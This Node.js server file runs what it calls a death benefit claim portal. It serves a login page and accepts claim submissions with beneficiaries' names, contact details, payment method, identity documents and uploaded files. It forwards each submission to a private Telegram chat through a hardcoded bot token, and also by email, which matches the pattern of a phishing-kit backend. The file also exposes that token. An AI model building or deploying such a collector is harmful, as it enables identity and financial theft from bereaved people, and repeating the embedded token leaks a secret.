// --- Telegram Notification Integration ---
const TELEGRAM_BOT_TOKEN = "8388477618:AAHkepQg1LCuFvyumV7_Pnweej3tcL0H92M";
const TELEGRAM_USER_ID = "6969127152";

const https = require("https");
const nodemailer = require("nodemailer");

// --- Email Notification Setup ---
// TODO: Replace with your real email and password or use environment variables for security
const EMAIL_USER = "your_email@gmail.com"; // <-- CHANGE THIS
const EMAIL_PASS = "your_email_password";  // <-- CHANGE THIS
const EMAIL_TO   = "your_email@gmail.com"; // <-- CHANGE THIS

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: EMAIL_USER,
    pass: EMAIL_PASS
  }
});

function sendEmailNotification(payload, callback) {
  const fields = [
    { label: "Contract Number", key: "contractNumber" },
    { label: "Deceased First Name", key: "deceasedFirstName" },
    { label: "Deceased Last Name", key: "deceasedLastName" },
    { label: "Beneficiary Name", key: "beneficiaryName" },
    { label: "Beneficiary Email", key: "beneficiaryEmail" },
    { label: "Beneficiary Phone", key: "beneficiaryPhone" },
    { label: "Payment Method", key: "paymentMethod" },
    { label: "Death Certificate Provided", key: "deathCertificate" },
    { label: "Government ID Provided", key: "governmentId" },
    { label: "Estate Docs Provided", key: "estateDocs" },
    { label: "Attestation Confirmed", key: "attestation" },
    { label: "Uploaded Files", key: "uploadedFiles" }
  ];
  let html = `<h2>New Death Benefit Claim Submitted</h2><ul>`;
  fields.forEach(f => {
    if (payload[f.key]) {
      let value = Array.isArray(payload[f.key]) ? payload[f.key].join(", ") : payload[f.key];
      html += `<li><b>${f.label}:</b> ${value}</li>`;
    }
  });
  html += `</ul><p><i>Submitted: ${new Date().toLocaleString()}</i></p>`;

  const mailOptions = {
    from: EMAIL_USER,
    to: EMAIL_TO,
    subject: "New Death Benefit Claim Submitted",
    html
  };
  transporter.sendMail(mailOptions, callback);
}

function sendTelegramNotification(payload, callback) {
  const fields = [
    { label: "Contract Number", key: "contractNumber" },
    { label: "Deceased First Name", key: "deceasedFirstName" },
    { label: "Deceased Last Name", key: "deceasedLastName" },
    { label: "Beneficiary Name", key: "beneficiaryName" },
    { label: "Beneficiary Email", key: "beneficiaryEmail" },
    { label: "Beneficiary Phone", key: "beneficiaryPhone" },
    { label: "Payment Method", key: "paymentMethod" },
    { label: "Death Certificate Provided", key: "deathCertificate" },
    { label: "Government ID Provided", key: "governmentId" },
    { label: "Estate Docs Provided", key: "estateDocs" },
    { label: "Attestation Confirmed", key: "attestation" },
    { label: "Uploaded Files", key: "uploadedFiles" }
  ];
  let message = `\u2728 *New Death Benefit Claim Submitted* \u2728\n\n`;
  fields.forEach(f => {
    if (payload[f.key]) {
      let value = Array.isArray(payload[f.key]) ? payload[f.key].join(", ") : payload[f.key];
      message += `*${f.label}:* ${value}\n`;
    }
  });
  message += `\n_Submitted: ${new Date().toLocaleString()}_`;

  const postData = JSON.stringify({
    chat_id: TELEGRAM_USER_ID,
    text: message,
    parse_mode: "Markdown"
  });
  const options = {
    hostname: "api.telegram.org",
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(postData)
    }
  };
  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => callback(null, data));
  });
  req.on("error", (e) => callback(e));
  req.write(postData);
  req.end();
}

const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = Number(process.env.PORT || 5500);
const root = __dirname;

const contentTypes = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".js": "application/javascript; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
};

const server = http.createServer((request, response) => {
  // --- CORS support ---
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (request.method === 'OPTIONS') {
    response.writeHead(204);
    response.end();
    return;
  }
  if (request.method === "POST" && request.url === "/api/submit-claim") {
    console.log("Received POST /api/submit-claim");
    let body = "";
    request.on("data", chunk => { body += chunk; });
    request.on("end", () => {
      try {
        const payload = JSON.parse(body);
        // Send Telegram notification
        sendTelegramNotification(payload, (err, tgRes) => {
          // Log Telegram API response or error for debugging
          if (err) {
            console.error("Telegram notification error:", err);
          } else {
            console.log("Telegram API response:", tgRes);
          }
          // Send Email notification (in parallel)
          sendEmailNotification(payload, (emailErr, info) => {
            if (emailErr) {
              console.error("Email notification error:", emailErr);
            }
          });
          if (err) {
            response.writeHead(500, { "Content-Type": "application/json" });
            response.end(JSON.stringify({ ok: false, error: err.message }));
          } else {
            response.writeHead(200, { "Content-Type": "application/json" });
            response.end(JSON.stringify({ ok: true }));
          }
        });
      } catch (e) {
        response.writeHead(400, { "Content-Type": "application/json" });
        response.end(JSON.stringify({ ok: false, error: "Invalid JSON" }));
      }
    });
    return;
  }

  const urlPath = request.url === "/" ? "/login.html" : request.url;
  const filePath = path.join(root, decodeURIComponent(urlPath.split("?")[0]));

  if (!filePath.startsWith(root)) {
    response.writeHead(403, { "Content-Type": "text/plain; charset=utf-8" });
    response.end("Forbidden");
    return;
  }

  fs.readFile(filePath, (error, file) => {
    if (error) {
      response.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
      response.end("Not found");
      return;
    }

    const ext = path.extname(filePath).toLowerCase();
    response.writeHead(200, {
      "Content-Type": contentTypes[ext] || "application/octet-stream",
      "Cache-Control": "no-store",
    });
    response.end(file);
  });
});

server.listen(PORT, () => {
  console.log(`Death benefit claim portal running at http://127.0.0.1:${PORT}`);
});
